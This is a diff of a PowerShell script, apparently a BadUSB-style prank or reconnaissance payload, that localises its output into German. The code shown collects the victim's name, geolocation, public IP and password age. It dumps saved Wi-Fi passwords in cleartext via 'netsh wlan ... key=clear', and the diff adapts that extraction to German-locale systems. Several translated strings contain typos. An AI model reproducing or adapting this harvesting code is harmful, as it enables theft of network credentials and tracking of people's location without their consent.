@@ -68,7 +68,7 @@ $fn = Get-Name
 
 echo "Hey" $fn >> $Env:temp\foo.txt
 
-echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
+echo "`nDein Computer ist nicht sehr sicher" >> $Env:temp\foo.txt
 
 #############################################################################################################################################
 
@@ -92,7 +92,7 @@ function Get-GeoLocation{
 		Write-Error 'Access Denied for Location Information'
 	} else {
 		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
+		if ($GL) { echo "`nYDeine Position: `n$GL" >> $Env:temp\foo.txt }
 	}
 	}
     # Write Error is just for troubleshooting
@@ -136,7 +136,7 @@ function Get-PubIP {
 }
 
 $PubIP = Get-PubIP
-if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
+if ($PubIP) { echo "`ndDeine Oeffentliche IP: $PubIP" >> $Env:temp\foo.txt }
 
 
 ###########################################################################################################
@@ -178,7 +178,7 @@ if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
 }
 
 $pls = Get-Days_Set
-if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
+if ($pls) { echo "`nPasswort das letzte Mal geändert: $pls" >> $Env:temp\foo.txt }
 
 
 ###########################################################################################################
@@ -212,7 +212,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
 
     #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
     try{
-        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Schlüsselinhalt") -split ":")[1]).Trim()
     }Catch{
         $WLANProfilePassword = "The password is not stored in this profile"
     }
